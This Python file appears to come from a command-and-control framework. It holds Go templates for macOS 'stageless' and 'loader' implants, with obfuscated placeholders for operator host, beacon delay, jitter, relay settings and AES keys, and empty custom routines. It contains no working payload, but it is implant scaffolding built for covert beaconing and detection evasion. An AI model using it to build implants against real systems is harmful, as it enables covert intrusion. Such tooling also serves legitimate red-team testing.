global_go = {
    "mac/stageless": """package global

import (
	"stageless/utils/obf"
)

var (
	Channel                = obf.S("<channel>")
	Host                   = obf.S("<host>")
	Port                   = obf.S("<port>")
	Path                   = obf.S("<path>")
	HostTag                = obf.S("<hostTag>")
	BodyContent            = map[string]string{}
	CustomCommunication    = obf.S("<customCommunication>")
	ServerResponseTemplate = obf.S("<serverResponseTemplate>")
	CustomCookies          = map[string]string{}
	CustomHeaders          = map[string]string{}
	BeaconDelay            = 867530901
	SecondDelay            = 867530904
	SecondDelayEnabled     = 867530905
	RelayTimeout           = 5 * 60 * 1000
	PipelineTarget         = obf.S("<pipelineTarget>")
	AesKey                 = "<aesKey>"
	AesRelayKey            = "<aesRelayKey>"
	BgWorkers              int32 = 0
	ActiveRelayPaths       []string
)
""",
    "mac/loader": """package global

import (
	"loader/utils/obf"
)

var (
	Channel                = obf.S("<channel>")
	Url                    = obf.S("<url>")
	HostTag                = obf.S("<hostTag>")
	BeaconDelay            = 867530901
	Jitter                 = 867530902
	RelayTimeout           = 5 * 60 * 1000
	PipelineTarget         = obf.S("<pipelineTarget>")
	AesKey                 = "<aesKey>"
	AesRelayKey            = "<aesRelayKey>"
)
""",
}

custom_routine_go = {
    "mac/stageless": "package routine\n\nfunc CustomMain() {}\n",
    "mac/loader": "package routine\n\nfunc CustomMain() {}\n",
}
